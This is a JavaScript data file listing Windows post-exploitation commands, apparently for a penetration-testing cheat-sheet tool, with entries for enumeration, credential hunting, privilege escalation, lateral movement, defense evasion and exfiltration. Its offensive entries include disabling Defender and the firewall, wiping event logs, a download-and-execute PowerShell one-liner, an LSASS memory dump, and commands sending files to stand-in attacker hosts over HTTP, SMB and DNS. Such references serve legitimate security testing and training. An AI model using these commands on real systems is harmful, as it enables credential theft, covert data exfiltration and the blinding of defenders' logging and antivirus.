export const windowsCommands = [
  // AWARENESS COMMANDS
  {
    id: "win-aware-001",
    os: "windows",
    category: "awareness",
    subcategory: "cmd",
    title: "System Information",
    description: "Display detailed system configuration",
    command: "systeminfo",
    example: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"',
    tools: [],
    tags: ["system", "os", "version"]
  },
  {
    id: "win-aware-002",
    os: "windows",
    category: "awareness",
    subcategory: "powershell",
    title: "Current User Info",
    description: "Get current user and privileges",
    command: "whoami /all",
    example: 'whoami /priv | findstr "SeImpersonatePrivilege"',
    tools: [],
    tags: ["user", "privileges", "token"]
  },
  {
    id: "win-aware-003",
    os: "windows",
    category: "awareness",
    subcategory: "powershell",
    title: "Domain Check",
    description: "Check if machine is domain-joined",
    command: "(Get-WmiObject Win32_ComputerSystem).PartOfDomain",
    example: null,
    tools: [],
    tags: ["domain", "ad", "workgroup"]
  },
  {
    id: "win-aware-004",
    os: "windows",
    category: "awareness",
    subcategory: "cmd",
    title: "Hostname",
    description: "Display the computer name",
    command: "hostname",
    example: null,
    tools: [],
    tags: ["hostname", "computer", "name"]
  },
  {
    id: "win-aware-005",
    os: "windows",
    category: "awareness",
    subcategory: "powershell",
    title: "Environment Variables",
    description: "List all environment variables",
    command: "Get-ChildItem Env:",
    example: "$env:USERNAME; $env:USERDOMAIN",
    tools: [],
    tags: ["environment", "variables", "env"]
  },

  // ENUMERATION COMMANDS
  {
    id: "win-enum-001",
    os: "windows",
    category: "enumeration",
    subcategory: "cmd",
    title: "List Local Users",
    description: "Enumerate all local user accounts",
    command: "net user",
    example: "net user administrator",
    tools: [],
    tags: ["users", "accounts"]
  },
  {
    id: "win-enum-002",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Running Processes",
    description: "List all running processes",
    command: "Get-Process",
    example: "Get-Process | Where-Object {$_.ProcessName -match 'defender|av'}",
    tools: [],
    tags: ["processes", "edr", "av"]
  },
  {
    id: "win-enum-003",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Installed Services",
    description: "List all Windows services",
    command: "Get-Service",
    example: "Get-Service | Where-Object {$_.Status -eq 'Running'}",
    tools: [],
    tags: ["services", "running"]
  },
  {
    id: "win-enum-004",
    os: "windows",
    category: "enumeration",
    subcategory: "wmi",
    title: "Anti-Virus Products",
    description: "Detect installed AV software",
    command: "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName",
    example: null,
    tools: [],
    tags: ["av", "antivirus", "edr", "security"]
  },
  {
    id: "win-enum-005",
    os: "windows",
    category: "enumeration",
    subcategory: "cmd",
    title: "Local Groups",
    description: "List local groups",
    command: "net localgroup",
    example: "net localgroup administrators",
    tools: [],
    tags: ["groups", "local", "admin"]
  },
  {
    id: "win-enum-006",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Installed Software",
    description: "List installed applications",
    command: "Get-WmiObject -Class Win32_Product | Select-Object Name, Version",
    example: null,
    tools: [],
    tags: ["software", "installed", "applications"]
  },

  // NETWORK COMMANDS
  {
    id: "win-net-001",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "Network Configuration",
    description: "Display IP configuration",
    command: "ipconfig /all",
    example: "ipconfig /displaydns",
    tools: [],
    tags: ["network", "ip", "dns"]
  },
  {
    id: "win-net-002",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "Active Connections",
    description: "Show active network connections",
    command: "netstat -ano",
    example: "netstat -ano | findstr ESTABLISHED",
    tools: [],
    tags: ["connections", "ports", "tcp"]
  },
  {
    id: "win-net-003",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "Network Shares",
    description: "List available network shares",
    command: "net view \\\\%COMPUTERNAME%",
    example: "net share",
    tools: [],
    tags: ["shares", "smb", "files"]
  },
  {
    id: "win-net-004",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "ARP Table",
    description: "Display ARP cache",
    command: "arp -a",
    example: null,
    tools: [],
    tags: ["arp", "cache", "network"]
  },
  {
    id: "win-net-005",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "Routing Table",
    description: "Display routing table",
    command: "route print",
    example: null,
    tools: [],
    tags: ["route", "routing", "network"]
  },

  // CREDENTIAL HUNTING
  {
    id: "win-cred-001",
    os: "windows",
    category: "credentials",
    subcategory: "cmd",
    title: "Saved Credentials",
    description: "Display stored credentials",
    command: "cmdkey /list",
    example: null,
    tools: [],
    tags: ["credentials", "saved", "passwords"]
  },
  {
    id: "win-cred-002",
    os: "windows",
    category: "credentials",
    subcategory: "cmd",
    title: "Search for Password Files",
    description: "Find files containing password strings",
    command: "findstr /si password *.xml *.ini *.txt *.config",
    example: "dir /s /b *password* *credential* 2>nul",
    tools: [],
    tags: ["passwords", "files", "config"]
  },
  {
    id: "win-cred-003",
    os: "windows",
    category: "credentials",
    subcategory: "powershell",
    title: "PowerShell History",
    description: "Read PowerShell command history",
    command: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
    example: null,
    tools: [],
    tags: ["history", "powershell", "commands"]
  },
  {
    id: "win-cred-004",
    os: "windows",
    category: "credentials",
    subcategory: "registry",
    title: "Registry Passwords",
    description: "Check registry for stored passwords",
    command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
    example: "reg query HKCU\\Software\\ORL\\WinVNC3\\Password",
    tools: [],
    tags: ["registry", "passwords", "autologon"]
  },
  {
    id: "win-cred-005",
    os: "windows",
    category: "credentials",
    subcategory: "powershell",
    title: "WiFi Passwords",
    description: "Extract saved WiFi passwords",
    command: "netsh wlan show profiles | ForEach-Object { if ($_ -match 'All User Profile\\s*:\\s*(.+)$') { netsh wlan show profile name=$matches[1] key=clear } }",
    example: null,
    tools: [],
    tags: ["wifi", "wireless", "passwords"]
  },

  // PRIVILEGE ESCALATION
  {
    id: "win-privesc-001",
    os: "windows",
    category: "privesc",
    subcategory: "cmd",
    title: "Check Privileges",
    description: "Display current user privileges",
    command: "whoami /priv",
    example: "whoami /priv | findstr SeImpersonatePrivilege",
    tools: ["JuicyPotato", "PrintSpoofer"],
    tags: ["privileges", "tokens", "impersonate"]
  },
  {
    id: "win-privesc-002",
    os: "windows",
    category: "privesc",
    subcategory: "cmd",
    title: "Unquoted Service Paths",
    description: "Find services with unquoted paths",
    command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\\\windows\\\\" | findstr /i /v """"',
    example: null,
    tools: [],
    tags: ["services", "unquoted", "paths"]
  },
  {
    id: "win-privesc-003",
    os: "windows",
    category: "privesc",
    subcategory: "registry",
    title: "AlwaysInstallElevated",
    description: "Check if AlwaysInstallElevated is enabled",
    command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    example: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    tools: [],
    tags: ["msi", "installer", "registry"]
  },
  {
    id: "win-privesc-004",
    os: "windows",
    category: "privesc",
    subcategory: "powershell",
    title: "Service Permissions",
    description: "Check service permissions for weak configs",
    command: "Get-WmiObject win32_service | Select-Object Name, StartName, PathName | Where-Object {$_.StartName -notlike 'LocalSystem'}",
    example: null,
    tools: ["AccessChk"],
    tags: ["services", "permissions", "weak"]
  },

  // PERSISTENCE
  {
    id: "win-persist-001",
    os: "windows",
    category: "persistence",
    subcategory: "registry",
    title: "Run Keys",
    description: "Check autorun registry keys",
    command: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    example: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    tools: [],
    tags: ["autorun", "registry", "startup"]
  },
  {
    id: "win-persist-002",
    os: "windows",
    category: "persistence",
    subcategory: "cmd",
    title: "Scheduled Tasks",
    description: "List all scheduled tasks",
    command: "schtasks /query /fo LIST /v",
    example: "schtasks /query /fo LIST | findstr TaskName",
    tools: [],
    tags: ["tasks", "scheduled", "cron"]
  },
  {
    id: "win-persist-003",
    os: "windows",
    category: "persistence",
    subcategory: "powershell",
    title: "Startup Programs",
    description: "Get startup programs via WMI",
    command: "Get-WmiObject Win32_StartupCommand",
    example: null,
    tools: [],
    tags: ["startup", "autorun", "wmi"]
  },
  {
    id: "win-persist-004",
    os: "windows",
    category: "persistence",
    subcategory: "cmd",
    title: "Startup Folder",
    description: "Check startup folder contents",
    command: "dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"",
    example: null,
    tools: [],
    tags: ["startup", "folder", "persistence"]
  },

  // LATERAL MOVEMENT
  {
    id: "win-lateral-001",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Domain Controllers",
    description: "Find domain controllers",
    command: "nltest /dclist:%userdomain%",
    example: "nslookup -type=SRV _ldap._tcp.dc._msdcs.%userdomain%",
    tools: [],
    tags: ["domain", "dc", "active directory"]
  },
  {
    id: "win-lateral-002",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Domain Users",
    description: "List domain user accounts",
    command: "net user /domain",
    example: 'net group "Domain Admins" /domain',
    tools: [],
    tags: ["domain", "users", "ad"]
  },
  {
    id: "win-lateral-003",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Active Sessions",
    description: "Show active user sessions",
    command: "qwinsta",
    example: "query user",
    tools: ["Mimikatz"],
    tags: ["sessions", "users", "rdp"]
  },
  {
    id: "win-lateral-004",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Remote Shares",
    description: "Access remote shares",
    command: "net use \\\\TARGET\\C$ /user:DOMAIN\\username password",
    example: "dir \\\\TARGET\\C$\\Users",
    tools: [],
    tags: ["shares", "remote", "smb"]
  },
  {
    id: "win-lateral-005",
    os: "windows",
    category: "lateral",
    subcategory: "wmi",
    title: "Remote Command Execution",
    description: "Execute commands on remote system via WMI",
    command: "wmic /node:TARGET process call create \"cmd.exe /c command\"",
    example: null,
    tools: [],
    tags: ["wmi", "remote", "execution"]
  },

  // ============================================
  // DEFENSE EVASION
  // ============================================
  {
    id: "win-defevade-001",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Disable Windows Defender",
    description: "Disable real-time protection (requires admin)",
    command: "Set-MpPreference -DisableRealtimeMonitoring $true",
    example: "Set-MpPreference -DisableIOAVProtection $true",
    tools: [],
    tags: ["defender", "av", "bypass", "evasion"]
  },
  {
    id: "win-defevade-002",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Exclude Path from Defender",
    description: "Add directory to Defender exclusions",
    command: "Add-MpPreference -ExclusionPath \"C:\\Temp\"",
    example: "Add-MpPreference -ExclusionProcess \"evil.exe\"",
    tools: [],
    tags: ["defender", "exclusion", "bypass"]
  },
  {
    id: "win-defevade-003",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Check Defender Status",
    description: "Get Windows Defender status and exclusions",
    command: "Get-MpPreference",
    example: "Get-MpComputerStatus",
    tools: [],
    tags: ["defender", "status", "recon"]
  },
  {
    id: "win-defevade-004",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Disable Firewall",
    description: "Turn off Windows Firewall",
    command: "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
    example: "netsh advfirewall set allprofiles state off",
    tools: [],
    tags: ["firewall", "bypass", "network"]
  },
  {
    id: "win-defevade-005",
    os: "windows",
    category: "defevade",
    subcategory: "cmd",
    title: "Clear Event Logs",
    description: "Wipe Windows event logs",
    command: "wevtutil cl System",
    example: "wevtutil cl Security && wevtutil cl Application",
    tools: [],
    tags: ["logs", "evasion", "cleanup"]
  },
  {
    id: "win-defevade-006",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Clear PowerShell History",
    description: "Remove PowerShell command history",
    command: "Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath",
    example: null,
    tools: [],
    tags: ["history", "cleanup", "powershell"]
  },
  {
    id: "win-defevade-007",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Bypass Execution Policy",
    description: "Execute scripts despite execution policy",
    command: "powershell -ExecutionPolicy Bypass -File script.ps1",
    example: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://site/script')\"",
    tools: [],
    tags: ["bypass", "executionpolicy", "powershell"]
  },
  {
    id: "win-defevade-008",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Disable Script Block Logging",
    description: "Turn off PowerShell script logging",
    command: "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0",
    example: null,
    tools: [],
    tags: ["logging", "powershell", "evasion"]
  },
  {
    id: "win-defevade-009",
    os: "windows",
    category: "defevade",
    subcategory: "cmd",
    title: "Timestomp Files",
    description: "Modify file timestamps",
    command: "copy /b file.exe +,,",
    example: "powershell (Get-Item file.txt).LastWriteTime = '01/01/2020 12:00:00'",
    tools: [],
    tags: ["timestamp", "antiforensics", "evasion"]
  },
  {
    id: "win-defevade-010",
    os: "windows",
    category: "defevade",
    subcategory: "powershell",
    title: "Check AMSI Status",
    description: "Verify AMSI is loaded",
    command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
    example: null,
    tools: [],
    tags: ["amsi", "bypass", "detection"]
  },

  // ============================================
  // DATA EXFILTRATION
  // ============================================
  {
    id: "win-exfil-001",
    os: "windows",
    category: "exfiltration",
    subcategory: "powershell",
    title: "Download File via PowerShell",
    description: "Download file from remote server",
    command: "(New-Object Net.WebClient).DownloadFile('http://site/file','C:\\temp\\file')",
    example: "Invoke-WebRequest -Uri http://site/file -OutFile C:\\temp\\file",
    tools: [],
    tags: ["download", "web", "transfer"]
  },
  {
    id: "win-exfil-002",
    os: "windows",
    category: "exfiltration",
    subcategory: "powershell",
    title: "Upload File via POST",
    description: "Exfiltrate file via HTTP POST",
    command: "Invoke-RestMethod -Uri http://attacker/upload -Method Post -InFile C:\\data.txt",
    example: null,
    tools: [],
    tags: ["upload", "exfil", "http"]
  },
  {
    id: "win-exfil-003",
    os: "windows",
    category: "exfiltration",
    subcategory: "powershell",
    title: "Base64 Encode File",
    description: "Encode file to base64 for exfil",
    command: "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\file.txt'))",
    example: null,
    tools: [],
    tags: ["base64", "encoding", "exfil"]
  },
  {
    id: "win-exfil-004",
    os: "windows",
    category: "exfiltration",
    subcategory: "cmd",
    title: "SMB File Copy",
    description: "Copy file to remote SMB share",
    command: "copy file.txt \\\\attacker\\share\\",
    example: "xcopy /s /e C:\\data \\\\attacker\\share\\",
    tools: [],
    tags: ["smb", "copy", "exfil"]
  },
  {
    id: "win-exfil-005",
    os: "windows",
    category: "exfiltration",
    subcategory: "powershell",
    title: "DNS Exfiltration",
    description: "Exfiltrate data via DNS queries",
    command: "Resolve-DnsName -Name \"$data.attacker.com\" -Server 8.8.8.8",
    example: null,
    tools: [],
    tags: ["dns", "exfil", "covert"]
  },
  {
    id: "win-exfil-006",
    os: "windows",
    category: "exfiltration",
    subcategory: "cmd",
    title: "Compress Files",
    description: "Create archive for exfiltration",
    command: "powershell Compress-Archive -Path C:\\data\\* -DestinationPath C:\\archive.zip",
    example: null,
    tools: [],
    tags: ["compression", "archive", "zip"]
  },
  {
    id: "win-exfil-007",
    os: "windows",
    category: "exfiltration",
    subcategory: "powershell",
    title: "Screenshot Capture",
    description: "Take screenshot of desktop",
    command: "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen",
    example: null,
    tools: [],
    tags: ["screenshot", "capture", "exfil"]
  },

  // ============================================
  // EXPANDED ENUMERATION
  // ============================================
  {
    id: "win-enum-016",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Domain Groups",
    description: "Enumerate all domain groups",
    command: "Get-ADGroup -Filter *",
    example: "net group /domain",
    tools: [],
    tags: ["ad", "groups", "domain"]
  },
  {
    id: "win-enum-017",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Domain Computers",
    description: "List all domain computers",
    command: "Get-ADComputer -Filter *",
    example: "net view /domain",
    tools: [],
    tags: ["ad", "computers", "domain"]
  },
  {
    id: "win-enum-018",
    os: "windows",
    category: "enumeration",
    subcategory: "cmd",
    title: "List Installed Software",
    description: "List installed applications via WMIC",
    command: "wmic product get name,version",
    example: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
    tools: [],
    tags: ["software", "applications", "installed"]
  },
  {
    id: "win-enum-019",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Logged On Users",
    description: "Show currently logged on users",
    command: "query user",
    example: "Get-WmiObject Win32_ComputerSystem | Select UserName",
    tools: [],
    tags: ["users", "logged", "sessions"]
  },
  {
    id: "win-enum-020",
    os: "windows",
    category: "enumeration",
    subcategory: "cmd",
    title: "All Environment Variables",
    description: "Display all environment variables",
    command: "set",
    example: "gci env:",
    tools: [],
    tags: ["environment", "variables", "config"]
  },
  {
    id: "win-enum-021",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Firewall Rules",
    description: "List Windows Firewall rules",
    command: "Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'}",
    example: "netsh advfirewall firewall show rule name=all",
    tools: [],
    tags: ["firewall", "rules", "network"]
  },
  {
    id: "win-enum-022",
    os: "windows",
    category: "enumeration",
    subcategory: "cmd",
    title: "Patch Level",
    description: "Check installed hotfixes",
    command: "wmic qfe list brief",
    example: "systeminfo | findstr /B /C:\"Hotfix\"",
    tools: [],
    tags: ["patches", "updates", "hotfix"]
  },
  {
    id: "win-enum-023",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "Mounted Drives",
    description: "List all mounted drives and shares",
    command: "Get-PSDrive -PSProvider FileSystem",
    example: "net use",
    tools: [],
    tags: ["drives", "shares", "mounted"]
  },
  {
    id: "win-enum-024",
    os: "windows",
    category: "enumeration",
    subcategory: "wmi",
    title: "BIOS Information",
    description: "Get BIOS and hardware info",
    command: "Get-WmiObject Win32_BIOS",
    example: "wmic bios get serialnumber,version",
    tools: [],
    tags: ["bios", "hardware", "serial"]
  },
  {
    id: "win-enum-025",
    os: "windows",
    category: "enumeration",
    subcategory: "powershell",
    title: "PowerShell Version",
    description: "Check PowerShell version",
    command: "$PSVersionTable.PSVersion",
    example: "Get-Host | Select-Object Version",
    tools: [],
    tags: ["powershell", "version", "info"]
  },
  {
    id: "win-enum-026",
    os: "windows",
    category: "enumeration",
    subcategory: "cmd",
    title: "Shared Folders",
    description: "List shared folders on local machine",
    command: "net share",
    example: "wmic share get name,path",
    tools: [],
    tags: ["shares", "folders", "smb"]
  },

  // ============================================
  // EXPANDED PRIVILEGE ESCALATION
  // ============================================
  {
    id: "win-privesc-010",
    os: "windows",
    category: "privesc",
    subcategory: "powershell",
    title: "Weak Service Permissions",
    description: "Find services with weak ACLs",
    command: "Get-Service | Get-Acl | Where-Object {$_.Access.IdentityReference -match 'Users'}",
    example: null,
    tools: ["Accesschk"],
    tags: ["services", "permissions", "acl"]
  },
  {
    id: "win-privesc-011",
    os: "windows",
    category: "privesc",
    subcategory: "cmd",
    title: "DLL Hijacking Opportunities",
    description: "Check PATH for writable directories",
    command: "echo %PATH%",
    example: "icacls \"C:\\Program Files\\App\" /grant Users:F",
    tools: [],
    tags: ["dll", "hijacking", "path"]
  },
  {
    id: "win-privesc-012",
    os: "windows",
    category: "privesc",
    subcategory: "powershell",
    title: "Credential Manager",
    description: "Dump credentials from Credential Manager",
    command: "Get-StoredCredential",
    example: "cmdkey /list",
    tools: [],
    tags: ["credentials", "vault", "passwords"]
  },
  {
    id: "win-privesc-013",
    os: "windows",
    category: "privesc",
    subcategory: "registry",
    title: "Autologon Credentials",
    description: "Check for saved autologon passwords",
    command: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
    example: null,
    tools: [],
    tags: ["autologon", "registry", "passwords"]
  },
  {
    id: "win-privesc-014",
    os: "windows",
    category: "privesc",
    subcategory: "cmd",
    title: "Writable Service Binaries",
    description: "Find services with writable executables",
    command: "for /f \"tokens=2 delims='='\" %a in ('wmic service get pathname^,displayname^,startmode ^| findstr /i \"auto\" ^| findstr /i /v \"c:\\windows\"') do icacls \"%a\"",
    example: null,
    tools: [],
    tags: ["services", "writable", "binaries"]
  },
  {
    id: "win-privesc-015",
    os: "windows",
    category: "privesc",
    subcategory: "powershell",
    title: "UAC Bypass Check",
    description: "Check UAC level",
    command: "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin",
    example: null,
    tools: [],
    tags: ["uac", "bypass", "privileges"]
  },

  // ============================================
  // EXPANDED NETWORK
  // ============================================
  {
    id: "win-net-010",
    os: "windows",
    category: "network",
    subcategory: "powershell",
    title: "WiFi Profiles",
    description: "List saved WiFi profiles",
    command: "netsh wlan show profiles",
    example: "netsh wlan show profile name=\"WiFiName\" key=clear",
    tools: [],
    tags: ["wifi", "wireless", "passwords"]
  },
  {
    id: "win-net-011",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "DNS Cache",
    description: "Display DNS resolver cache",
    command: "ipconfig /displaydns",
    example: "ipconfig /flushdns",
    tools: [],
    tags: ["dns", "cache", "resolver"]
  },
  {
    id: "win-net-012",
    os: "windows",
    category: "network",
    subcategory: "powershell",
    title: "Test Network Port",
    description: "Check if remote port is open",
    command: "Test-NetConnection -ComputerName target -Port 445",
    example: null,
    tools: [],
    tags: ["port", "scan", "network"]
  },
  {
    id: "win-net-013",
    os: "windows",
    category: "network",
    subcategory: "cmd",
    title: "Network Adapters",
    description: "List network adapter details",
    command: "wmic nic get name,macaddress,speed",
    example: "getmac /v",
    tools: [],
    tags: ["adapters", "mac", "network"]
  },

  // ============================================
  // EXPANDED LATERAL MOVEMENT
  // ============================================
  {
    id: "win-lateral-006",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "PSExec Remote Execution",
    description: "Execute commands on remote system",
    command: "psexec \\\\target -u domain\\user -p password cmd",
    example: null,
    tools: ["PsExec", "Impacket"],
    tags: ["psexec", "remote", "execution"]
  },
  {
    id: "win-lateral-007",
    os: "windows",
    category: "lateral",
    subcategory: "powershell",
    title: "WinRM Remote Session",
    description: "Create PowerShell remote session",
    command: "Enter-PSSession -ComputerName target -Credential (Get-Credential)",
    example: "Invoke-Command -ComputerName target -ScriptBlock {whoami}",
    tools: [],
    tags: ["winrm", "remote", "powershell"]
  },
  {
    id: "win-lateral-008",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Remote Desktop Sessions",
    description: "Query remote RDP sessions",
    command: "qwinsta /server:target",
    example: null,
    tools: [],
    tags: ["rdp", "sessions", "remote"]
  },
  {
    id: "win-lateral-009",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Map Network Drive",
    description: "Mount remote share with credentials",
    command: "net use Z: \\\\target\\share /user:domain\\user password",
    example: null,
    tools: [],
    tags: ["shares", "mount", "credentials"]
  },
  {
    id: "win-lateral-010",
    os: "windows",
    category: "lateral",
    subcategory: "powershell",
    title: "WMI Remote Execution",
    description: "Execute commands via WMI",
    command: "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c command' -ComputerName target",
    example: null,
    tools: [],
    tags: ["wmi", "remote", "execution"]
  },
  {
    id: "win-lateral-011",
    os: "windows",
    category: "lateral",
    subcategory: "cmd",
    title: "Trust Relationships",
    description: "Display domain trust relationships",
    command: "nltest /domain_trusts",
    example: null,
    tools: ["BloodHound"],
    tags: ["trust", "domain", "ad"]
  },

  // ============================================
  // EXPANDED CREDENTIALS
  // ============================================
  {
    id: "win-cred-011",
    os: "windows",
    category: "credentials",
    subcategory: "cmd",
    title: "Unattended Install Files",
    description: "Search for unattended install configs",
    command: "dir /s C:\\*unattend.xml",
    example: "type C:\\Windows\\Panther\\Unattend.xml",
    tools: [],
    tags: ["unattend", "passwords", "config"]
  },
  {
    id: "win-cred-012",
    os: "windows",
    category: "credentials",
    subcategory: "powershell",
    title: "GPP Passwords",
    description: "Search for Group Policy Preferences passwords",
    command: "findstr /S /I cpassword \\\\domain\\sysvol\\*.xml",
    example: null,
    tools: ["Get-GPPPassword"],
    tags: ["gpp", "passwords", "sysvol"]
  },
  {
    id: "win-cred-013",
    os: "windows",
    category: "credentials",
    subcategory: "powershell",
    title: "LSASS Dump",
    description: "Dump LSASS process memory",
    command: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
    example: null,
    tools: ["Mimikatz", "ProcDump"],
    tags: ["lsass", "dump", "credentials"]
  },
  {
    id: "win-cred-014",
    os: "windows",
    category: "credentials",
    subcategory: "registry",
    title: "VNC Passwords",
    description: "Extract VNC passwords from registry",
    command: "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"",
    example: "reg query HKLM\\SOFTWARE\\RealVNC\\WinVNC4 /v Password",
    tools: [],
    tags: ["vnc", "passwords", "registry"]
  },
  {
    id: "win-cred-015",
    os: "windows",
    category: "credentials",
    subcategory: "cmd",
    title: "Browser Credentials",
    description: "Locate browser credential stores",
    command: "dir /s /b %LOCALAPPDATA%\\*Login Data*",
    example: "dir /s /b %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json",
    tools: ["LaZagne", "BrowserGhost"],
    tags: ["browser", "passwords", "chrome"]
  },
  {
    id: "win-cred-016",
    os: "windows",
    category: "credentials",
    subcategory: "powershell",
    title: "DPAPI Master Keys",
    description: "Locate DPAPI master keys",
    command: "ls -Force C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\",
    example: null,
    tools: ["Mimikatz"],
    tags: ["dpapi", "keys", "encryption"]
  }
];
